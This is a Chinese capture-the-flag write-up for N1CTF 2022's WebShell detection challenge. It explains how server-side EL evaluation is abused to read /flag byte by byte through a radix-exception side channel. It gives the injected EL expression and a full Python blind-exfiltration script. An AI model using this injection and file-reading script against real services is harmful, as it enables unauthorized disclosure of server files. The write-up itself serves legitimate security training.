# N1CTF 2022 - WebShell Detection

## 题目简述

题目提供一个 WebShell 检测 API，提交 Java/JSP 风格的文本和 import 列表后，服务会解析其中的 EL 表达式并返回检测类型。目标环境不允许出网，响应也不会直接回显表达式结果，但表达式确实会在服务端执行。

仓库只保留了简短思路。NeSE Team 的 [N1CTF 2022 题解 PDF](https://nese.team/writeup/n1ctf2022.pdf) 保存了逐字节盲注脚本；其中终端和代码截图均为纯文本，下面已转写并补全被页面裁切的表达式语义。

## 解题过程

### 确认 EL 会执行

导入 `java.nio.file.Files` 和 `java.nio.file.Paths` 后，读取存在文件的 EL 表达式可以正常通过，而读取不存在文件会产生 `ELException`。这说明检测器不是只做字符串匹配，而是会求值表达式；正常返回与异常返回就构成一位侧信道。

仓库说明还给出了另一种分类侧信道：

```javascript
exec(cond ? params.cmd : "const")
```

当 `cond` 为真时，`exec` 参数被判定为用户可控，风险等级较高；为假时参数是常量，等级较低。实际盲注脚本使用的是更直接的“正常求值 / EL 异常”差异。

### 用 radix 制造可控异常

最直观的除零异常构造不可用，`BigInteger.valueOf` 也被黑名单拦截。但 Java 的：

```java
Integer.valueOf("1", radix)
```

只接受 $2\leq radix\leq36$；当 `radix > 36` 时会抛出 `NumberFormatException`，并进一步表现为 EL 异常。

设 flag 第 `idx` 个字节为 $b$，枚举 `code` 并把 radix 设置为：

$$
radix=b-code.
$$

从 `code = 0` 递增时，前面的 radix 均大于 36，会触发异常；第一次正常返回发生在 $b-code=36$，因此：

$$
b=code+36.
$$

对应的 EL 表达式为：

```text
${Integer.valueOf("1", Files.readAllBytes(Paths.get("/flag"))[idx] - code)}
```

需要同时提交：

```text
java.nio.file.Files
java.nio.file.Paths
```

### 自动逐字节恢复

根据比赛材料，接口为 `/api/detect_text`，JSON 字段为 `content` 和 `imports`。整理后的脚本如下：

```python
import requests

TARGET = "https://target/api/detect_text"
session = requests.Session()
session.verify = False

imports = "java.nio.file.Files\njava.nio.file.Paths"

def probe(index, code):
    expression = (
        '${Integer.valueOf("1", '
        f'Files.readAllBytes(Paths.get("/flag"))[{index}] - {code}'
        ')}'
    )
    response = session.post(
        TARGET,
        json={"content": expression, "imports": imports},
        timeout=5,
    )
    response.raise_for_status()
    return response.json()["type"] == "NORMAL"

flag = ""
for index in range(255):
    found = False
    for code in range(128 - 36):
        if probe(index, code):
            flag += chr(code + 36)
            print(flag)
            found = True
            break

    if not found or flag.endswith("}"):
        break
```

这里枚举的明文字节范围是 36 到 127，覆盖常见可打印 flag 字符。正式利用前应先分别提交一个必然正常和一个必然异常的表达式，确认目标版本中 `NORMAL` 的极性；若接口使用不同枚举值，只需调整 `probe` 的返回判断，数学关系不变。

现有仓库和外部材料都没有保存最终盲注出的 flag，因此不补写未经证实的内容。

## 方法总结

本题的核心是把“检测结果”转化为异常侧信道，而不是寻找直接回显。`Integer.valueOf(String, radix)` 提供了边界清晰的异常条件，结合文件字节构造 $radix=b-code$，便能用第一次正常返回定位字符。处理盲注脚本时，应先校准响应极性、限制重试和超时，并在已知 flag 终止符处停止，避免把网络故障误判成条件结果。
